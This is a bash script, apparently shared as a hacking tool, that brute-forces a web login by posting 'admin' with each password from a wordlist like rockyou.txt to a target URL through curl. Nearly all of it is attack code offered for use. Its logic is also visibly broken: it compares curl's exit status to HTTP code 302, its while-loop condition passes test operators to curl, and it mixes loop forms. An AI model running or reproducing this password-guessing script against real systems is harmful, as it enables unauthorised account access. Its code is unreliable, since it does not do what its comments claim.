# Need something to bust a json token??
# Or check basic Auth passwords or other things in curl
# New solution bash it :)
# Change line 16 according to the curl parms needed.
# ex. usage: ./CurlBashCracker.sh /usr/share/wordlists/rockyou.txt http://10.10.10.10

#TODO: Multithreading and cleaning this up making it even better..fork on fork on



#!/bin/bash

if test $# -ne 2;
then
    clear
    echo Script name: $0
    echo "Usage: "$0" [wordlist] [target]"
    echo "Number of args supplied: "$#
else
    while curl --data "username=admin&password=$line" $2 1>/dev/null -ne 302; do
        for line in $(cat $1);do
            echo "Trying" $line" for login"
            curl --data "username=admin&password=$line" $2 1>/dev/null 2>&1
            if [ $? -eq 302 ];then
                echo "login sucessful"
                echo $line
                break
            elif [ $? -ne 200 ]; then
                echo "failed"
            fi
        done < $1
        done
        fi

# Don't never forget Hacktheplanet!
# Script by Robert Ross(Root) && C-3P0







